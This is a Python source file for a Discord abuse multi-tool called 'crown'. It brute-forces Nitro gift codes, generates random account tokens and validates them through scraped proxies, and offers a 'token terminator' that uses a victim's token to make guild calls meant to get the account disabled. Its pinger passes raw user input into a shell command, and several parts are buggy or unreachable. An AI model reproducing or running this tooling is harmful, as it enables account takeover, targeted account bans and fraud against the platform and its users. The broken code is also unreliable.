import os
import random
import string
import time
import ctypes
import sys
import requests
import base64
import json
from colorama import Fore
from colorama import Style
from itertools import cycle
from random import randint
from lxml.html import fromstring
import traceback
import threading


def slowprint(s, c, newLine=True):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1. / 30)


def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    if os.name == 'nt':
        os.system("title crown")
    else:
        print('crown')

    print(f'''


    {Fore.RED}                                  ░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗███╗░░██╗{Fore.RESET}
    {Fore.LIGHTRED_EX}                                  ██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║████╗░██║{Fore.RESET}
    {Fore.YELLOW}                                  ██║░░╚═╝██████╔╝██║░░██║░╚██╗████╗██╔╝██╔██╗██║{Fore.RESET}
    {Fore.LIGHTYELLOW_EX}                                  ██║░░██╗██╔══██╗██║░░██║░░████╔═████║░██║╚████║{Fore.RESET}
    {Fore.LIGHTCYAN_EX}                                  ╚█████╔╝██║░░██║╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║{Fore.RESET}
    {Fore.BLUE}                                  ░╚════╝░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝{Fore.RESET}
               ''')

    time.sleep(2)
    slowprint(
        f'{Fore.LIGHTBLACK_EX}Made by: {Fore.RESET}{Fore.RED}crown{Fore.RESET}', .02)
    time.sleep(1)

    operation = input(f'''
    {Fore.RED}                                                        whatchu wanna do?{Fore.RESET}

    {Fore.BLUE}                                                   [1] Nitro Gen and Checker
                                                       [2] Token Gen and Checker
                                                       [3] Token Terminator
                                                       [4] Proxy Scraper
                                                       [5] Proxy Checker
                                                       [6] Pinger
                                                       [7] Exit{Fore.RESET}
>''')
    if str(operation) == "1":
        generateCheck()
    elif str(operation) == "2":
        tokengen()
    elif str(operation) == "3":
        terminate()
    elif str(operation) == "4":
        proxy()
    elif str(operation) == "5":
        proxychecker()
    elif str(operation) == "6":
        pinger()
    elif str(operation) == "7":
        exit()
    else:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n                                                      Incorrect option")
        time.sleep(2)
        main()


def generateCheck():
    os.system('cls' if os.name == 'nt' else 'clear')
    while True:
        code = ''.join(random.choices(
            string.ascii_uppercase + string.digits + string.ascii_lowercase,
            k=16
        ))

        url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
        s = requests.session()
        response = s.get(url)

        nitro = f'{Fore.LIGHTBLACK_EX}https://discord.gift/{Fore.RESET}' + code

        if 'subscription_plan' in response.text:
            print(f'{Fore.LIGHTGREEN_EX}Valid code{Fore.RESET} | {nitro}')
            print("FOUND CODE")
            with open("code.txt", "w") as f:
                f.write(nitro)
            break

        else:
            print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {nitro}')
            continue


def get_proxies():
    url = 'https://sslproxies.org/'
    response = requests.get(url)
    parser = fromstring(response.text)
    proxies = set()
    for i in parser.xpath('//tbody/tr')[:10]:
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            proxy = ":".join([i.xpath('.//td[1]/text()')[0],
                             i.xpath('.//td[2]/text()')[0]])
            proxies.add(proxy)
    return proxies


def terminate():
    token = input("Enter the token you want to terminate: ")
    while True:
        print("Terminating token...")
        api = requests.get("https://discordapp.com/api/v6/invite/malaya")
        data = api.json()
        check = requests.get(
            "https://discordapp.com/api/v6/guilds/" +
            data['guild']['id'],
            headers={
                "Authorization": token})
        stuff = check.json()
        requests.post(
            "https://discordapp.com/api/v6/invite/malaya",
            headers={
                "Authorization": token})
        requests.delete(
            "https://discordapp.com/api/v6/guiilds" +
            data['guild']['id'],
            headers={
                "Authorization": token})

        if stuff['code'] == 0:
            print("Successfully disabled!")
            print("Disabler by NullCode and Giggl3z")
            time.sleep(2)
            break
            main()


def tokengen():

    N = input("How many you want?: ")
    count = 0
    current_path = os.path.dirname(os.path.realpath(__file__))
    url = "https://discordapp.com/api/v6/users/@me/library"

    while(int(count) < int(N)):
        tokens = []
        base64_string = "=="
        while(base64_string.find("==") != -1):
            sample_string = str(
                randint(
                    000000000000000000,
                    999999999999999999))
            sample_string_bytes = sample_string.encode("ascii")
            base64_bytes = base64.b64encode(sample_string_bytes)
            base64_string = base64_bytes.decode("ascii")
        else:
            token = base64_string + "." + random.choice(
                string.ascii_letters).upper() + ''.join(
                random.choice(
                    string.ascii_letters + string.digits) for _ in range(5)) + "." + ''.join(
                random.choice(
                    string.ascii_letters + string.digits) for _ in range(27))
            count += 1
            tokens.append(token)
        proxies = get_proxies()
        proxy_pool = cycle(proxies)

        for token in tokens:
            proxy = next(proxy_pool)
            header = {
                "Content-Type": "application/json",
                "authorization": token
            }
            r = requests.get(url, headers=header, proxies={"http": proxy})
            if r.status_code == 200:
                print("f'{Fore.LIGHTGREEN_EX}Valid{Fore.RESET} | {token}'")
                with open("workingtokens.txt", "a") as f:
                    f.write(token + "\n")

            elif "rate limited." in r.text:
                print("[-] You are being rate limited.")
                main()

            else:
                print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {token}')
        tokens.remove(token)


def proxy():
    os.system('cls')

    url = 'https://api.openproxylist.xyz/http.txt'
    r = requests.get(url)
    results = r.text
    with open("http.txt", "w") as file:
        file.write(results)
    print('done http')

    url = 'https://api.openproxylist.xyz/socks4.txt'
    r = requests.get(url)
    results = r.text
    with open("socks4.txt", "w") as file:
        file.write(results)
    print('done socks4')

    url = 'https://api.openproxylist.xyz/socks5.txt'
    r = requests.get(url)
    results = r.text
    with open("socks5.txt", "w") as file:
        file.write(results)
    print('done socks4')
    time.sleep(2)
    main()


def proxychecker():


    r = requests.Session()

    def check(prox):
	    link = 'http://google.com/'
	    r.proxies = {
	    'http':'http://{}'.format(prox),
	    'https':'http://{}'.format(prox)
	    }
	    try:
		    req = r.get(link,timeout=2)
		    if req.status_code == 200:
			    print(Fore.LIGHTGREEN_EX+" Good [{}]".format(prox))
			    with open('good.txt','a') as wr: #w writes to good.txt in folder
				    wr.write(prox+'\n')
		    else:
				    print(Fore.YELLOW +" Blocked [{}]".format(prox))
	    except:
		    print(Fore.LIGHTRED_EX+" Bad [{}]".format(prox))
    proxies=open('proxies.txt', 'r').read().splitlines() # reads from proxies.txt in folder
    from multiprocessing.dummy import Pool as ThreadPool
    pool = ThreadPool(13)
    results = pool.map(check, proxies)
main()

def pinger():

    os.system("mode con:cols=61 lines=30")
    os.system("@title 666 Pinger & cls")
    print("          66666666           66666666           66666666  ")
    time.sleep(0.17)
    os.system("color 01")
    print("         66666666           66666666           66666666 ")
    time.sleep(0.17)
    os.system("color 03")
    print("        66666666           66666666           66666666 ")
    time.sleep(0.17)
    os.system("color 05")
    print("       66666666           66666666           66666666 ")
    time.sleep(0.17)
    os.system("color 07")
    print("      66666666           66666666           66666666 ")
    time.sleep(0.17)
    os.system("color 09")
    print("     66666666           66666666           66666666 ")
    time.sleep(0.17)
    os.system("color 01")
    print("    66666666           66666666           66666666  ")
    time.sleep(0.17)
    os.system("color 03")
    print("   66666666666666     66666666666666     66666666666666 ")
    time.sleep(0.17)
    os.system("color 05")
    print("  66666666666666666  66666666666666666  66666666666666666")
    time.sleep(0.17)
    os.system("color 07")
    print("  666666666666666666 666666666666666666 666666666666666666 ")
    time.sleep(0.17)
    os.system("color 09")
    print("  6666666     66666666666666     66666666666666     6666666")
    time.sleep(0.17)
    os.system("color 01")
    print("  6666666     66666666666666     66666666666666     6666666")
    time.sleep(0.17)
    os.system("color 03")
    print("  666666666666666666666666666666666666666666666666666666666")
    time.sleep(0.17)
    os.system("color 05")
    print("   66666666666666666  66666666666666666  66666666666666666 ")
    time.sleep(0.17)
    os.system("color 07")
    print("     6666666666666      6666666666666      6666666666666 ")
    time.sleep(0.17)
    os.system("color 4F")
    print("       666666666          666666666          666666666 ")

    ip = str(input("\nEnter IP fam: "))

    while True:
        if os.system("ping -n 1 " + ip + ">nul") == 0:
            print(ip + " is alive!")
            os.system("color " + str(random.randrange(0, 9)))
        else:
            print(ip + " Get downed SKID")
            os.system("color " + str(random.randrange(0, 9)))
            time.sleep(2)
            os.system("mode con:cols=120lines=20")
            main()


def exit():
    slowprint('bye bye darlin', .02)
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')
    raise SystemExit


if __name__ == '__main__':
    main()
